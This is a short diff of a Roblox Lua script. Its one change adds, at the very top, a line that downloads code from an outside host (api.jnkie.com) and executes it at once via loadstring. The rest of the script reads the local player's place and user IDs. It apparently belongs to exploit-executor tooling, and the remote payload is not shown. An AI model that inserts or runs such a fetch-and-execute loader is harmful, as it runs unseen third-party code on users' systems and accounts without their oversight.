@@ -1,3 +1,5 @@
+loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/9fc6ea0998205cd9d3d2ff03edb8c51d64dd723e390cd1c89f6feff616362a5e/download"))()
+
 local gameid = game.PlaceId
 local player = game.Players.LocalPlayer
 local UserId = player.UserId
